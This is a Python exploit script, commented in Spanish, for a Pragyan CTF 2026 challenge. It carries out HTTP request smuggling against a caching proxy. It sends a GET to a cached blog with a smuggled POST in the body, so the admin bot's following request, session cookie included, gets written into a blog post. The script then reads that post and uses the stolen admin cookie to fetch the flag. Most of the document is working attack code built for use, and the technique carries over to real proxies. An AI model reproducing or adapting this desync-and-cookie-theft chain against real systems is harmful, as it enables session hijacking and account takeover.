#!/usr/bin/env python3
"""
Crossing Boundaries - HTTP Request Smuggling Exploit
Pragyan CTF 2026

Técnica: Cache HIT Skip Body Read
Vector: GET a blog cacheado con Content-Length → body queda en buffer → POST smuggled
        captura admin request → leak cookie → GET /flag
"""

import requests
import re
import time
import uuid
import socket
import ssl
import urllib.parse
import sys

# =============================================================================
# Configuración
# =============================================================================

HOST = "crossing-boundaries.ctf.prgy.in"
BASE = f"https://{HOST}"

# Blog público que está pre-cacheado en el proxy
CACHED_BLOG = "c2e38584-480c-4397-9776-9ceabcfd4e06"  # "About Moderation"

def log(msg, level="INFO"):
    """Simple logging function"""
    symbol = {
        "INFO": "[*]",
        "SUCCESS": "[+]",
        "WARNING": "[!]",
        "ERROR": "[-]",
        "STEP": "[>]"
    }
    print(f"{symbol.get(level, '[*]')} {msg}")

# =============================================================================
# Exploit Functions
# =============================================================================

def register_and_login():
    """
    Paso 1: Registro y autenticación

    Crea una nueva cuenta de usuario y obtiene la cookie de sesión.
    """
    log("PASO 1: Registro y Autenticación", "STEP")

    username = "exploit_" + uuid.uuid4().hex[:10]
    password = "exploit_pass_" + "A" * 30

    log(f"Registrando usuario: {username}")

    sess = requests.Session()

    try:
        sess.post(f"{BASE}/register",
                  data={"username": username, "password": password},
                  timeout=10)

        sess.post(f"{BASE}/login",
                  data={"username": username, "password": password},
                  timeout=10)

        user_session = sess.cookies.get("session")

        log(f"Usuario registrado: {username}", "INFO")
        log(f"Sesión obtenida: {user_session[:20]}...", "INFO")

        return sess, user_session

    except Exception as e:
        log(f"Error en registro/login: {e}", "ERROR")
        sys.exit(1)

def create_review_blog(sess):
    """
    Paso 2: Crear blog para admin review

    Crea un blog y solicita que el admin bot lo revise.
    El bot visitará el blog después de ~10 segundos.
    """
    log("PASO 2: Crear Blog para Admin Review", "STEP")

    try:
        # Crear blog
        log("Creando blog...")
        sess.post(f"{BASE}/my-blogs/create",
                  data={"content": "Please review this blog! " + "X" * 50},
                  timeout=10)

        # Obtener ID del blog
        r = sess.get(f"{BASE}/my-blogs", timeout=10)
        blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', r.text)

        if not blogs:
            log("No se pudo crear blog", "ERROR")
            sys.exit(1)

        review_blog = blogs[0]
        log(f"Blog creado: {review_blog}", "INFO")

        # Solicitar review
        log("Solicitando admin review...")
        sess.post(f"{BASE}/my-blogs/{review_blog}/review", timeout=10)
        log("Admin bot visitará en ~10 segundos", "INFO")

        return review_blog

    except Exception as e:
        log(f"Error creando blog: {e}", "ERROR")
        sys.exit(1)

def execute_smuggling(user_session):
    """
    Paso 3: HTTP Request Smuggling

    Ejecuta el ataque de smuggling:
    1. Construye POST smuggled con CL grande pero body pequeño
    2. Envía GET a blog cacheado con el POST como body
    3. Cache HIT → body no se lee → queda en buffer
    4. POST se parsea como siguiente request
    5. POST espera 236 bytes más (admin request)
    """
    log("PASO 3: HTTP Request Smuggling", "STEP")

    # Marker único para identificar el blog con leak
    marker = f"LEAK_{uuid.uuid4().hex[:6]}_"
    log(f"Marker: {marker}")

    # POST smuggled con Content-Length grande pero body pequeño
    inner_body_len = 256  # Declaramos que enviaremos 256 bytes
    inner_body = f"content={marker}".encode()  # Solo enviamos ~20 bytes

    inner_request = (
        f"POST /my-blogs/create HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Cookie: session={user_session}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {inner_body_len}\r\n"
        f"\r\n"
    ).encode() + inner_body

    bytes_faltantes = inner_body_len - len(inner_body)
    log(f"POST smuggled: {len(inner_request)} bytes totales")
    log(f"Esperará {bytes_faltantes} bytes adicionales (admin request)")

    # Carrier: GET a blog cacheado con Content-Length
    try:
        log(f"Conectando a {HOST}:443...")
        sock = socket.create_connection((HOST, 443), timeout=15)
        ctx = ssl.create_default_context()
        conn = ctx.wrap_socket(sock, server_hostname=HOST)

        carrier = (
            f"GET /blogs/{CACHED_BLOG} HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Cookie: session={user_session}\r\n"
            f"Content-Length: {len(inner_request)}\r\n"
            f"\r\n"
        ).encode() + inner_request

        log(f"Enviando carrier request ({len(carrier)} bytes)...")
        conn.sendall(carrier)

        # Leer response del cache HIT
        cache_response = conn.recv(4096)
        log("Cache HIT response recibida", "INFO")
        log("POST smuggled queda en buffer del proxy", "INFO")

        conn.close()

        return marker

    except Exception as e:
        log(f"Error en smuggling: {e}", "ERROR")
        sys.exit(1)

def wait_for_admin():
    """
    Paso 4: Esperar Admin Bot

    Espera a que el admin bot visite el blog.
    El request del bot se leerá como body del POST smuggled.
    """
    log("PASO 4: Esperando Admin Bot", "STEP")
    log("El admin request se leerá como body del POST smuggled")

    wait_time = 16  # Admin llega en ~10 seg, margen de seguridad

    for i in range(wait_time, 0, -1):
        print(f"  Esperando... {i:2d} segundos", end='\r')
        time.sleep(1)

    print()  # Nueva línea
    log("Tiempo de espera completado", "INFO")

def extract_admin_cookie(sess, marker):
    """
    Paso 5: Extraer Admin Cookie

    Busca el blog que contiene el marker.
    El contenido del blog incluirá el request del admin con su cookie.
    """
    log("PASO 5: Extrayendo Admin Cookie", "STEP")

    try:
        r = sess.get(f"{BASE}/my-blogs", timeout=10)
        blogs = re.findall(r'/my-blogs/([a-f0-9-]{36})', r.text)
        log(f"Total blogs: {len(blogs)}")

        admin_cookie = None

        for blog_id in blogs:
            try:
                r = sess.get(f"{BASE}/my-blogs/{blog_id}", timeout=10)
                content = r.text

                if marker in content:
                    log(f"Blog con marker encontrado: {blog_id}", "INFO")

                    # Decodificar URL encoding
                    decoded = urllib.parse.unquote_plus(content)

                    # Extraer cookie del admin request
                    match = re.search(r'Cookie:\s*session=([a-f0-9-]{36})', decoded)
                    if match:
                        admin_cookie = match.group(1)
                        log(f"Admin cookie leaked: {admin_cookie}", "INFO")
                        break
                    else:
                        log("Marker encontrado pero no cookie", "WARNING")
            except:
                continue

        if not admin_cookie:
            log("No se encontró admin cookie en los blogs", "ERROR")
            log("Posibles causas:", "WARNING")
            log("  • Timing incorrecto (admin ya visitó)", "WARNING")
            log("  • Blog cacheado incorrecto", "WARNING")
            log("  • Ajustar Content-Length del POST", "WARNING")
            sys.exit(1)

        return admin_cookie

    except Exception as e:
        log(f"Error buscando blogs: {e}", "ERROR")
        sys.exit(1)

def get_flag(admin_cookie):
    """
    Paso 6: Obtener Flag

    Usa la cookie del admin para acceder a /flag.
    """
    log("PASO 6: Obteniendo Flag", "STEP")

    try:
        admin_sess = requests.Session()
        admin_sess.cookies.set("session", admin_cookie)

        log("Accediendo a /flag con cookie de admin...")
        r = admin_sess.get(f"{BASE}/flag", timeout=10)

        # Buscar flag en formato p_ctf{...}
        flag_match = re.search(r'p_ctf\{[^}]+\}', r.text)

        if flag_match:
            flag = flag_match.group(0)

            # Mostrar flag
            print(f"\n[+] FLAG: {flag}")

            # Guardar flag
            try:
                with open("/root/ctf/flags.txt", "a") as f:
                    f.write(f"Crossing Boundaries: {flag}\n")
                log("Flag guardada en /root/ctf/flags.txt", "INFO")
            except:
                pass

            return flag
        else:
            log("No se encontró flag en la respuesta", "ERROR")
            log("Response:", "INFO")
            print(r.text[:500])
            sys.exit(1)

    except Exception as e:
        log(f"Error obteniendo flag: {e}", "ERROR")
        sys.exit(1)

# =============================================================================
# Main Exploit Chain
# =============================================================================

def main():
    """
    Función principal que encadena todos los pasos del exploit.
    """
    log("Crossing Boundaries - HTTP Request Smuggling", "INFO")
    log(f"Target: {HOST}", "INFO")
    log(f"Blog cacheado: {CACHED_BLOG}", "INFO")
    print()

    try:
        # Paso 1: Registro y Login
        sess, user_session = register_and_login()
        print()

        # Paso 2: Crear Blog para Review
        review_blog = create_review_blog(sess)
        print()

        # Paso 3: HTTP Request Smuggling
        marker = execute_smuggling(user_session)
        print()

        # Paso 4: Esperar Admin Bot
        wait_for_admin()
        print()

        # Paso 5: Extraer Admin Cookie
        admin_cookie = extract_admin_cookie(sess, marker)
        print()

        # Paso 6: Obtener Flag
        flag = get_flag(admin_cookie)

        # Resumen final
        log("Exploit completado", "INFO")
        print(f"\nAdmin Cookie: {admin_cookie}")
        print(f"Flag: {flag}\n")

    except KeyboardInterrupt:
        print("\n")
        log("Exploit interrumpido por el usuario", "WARNING")
        sys.exit(0)
    except Exception as e:
        print("\n")
        log(f"Error inesperado: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
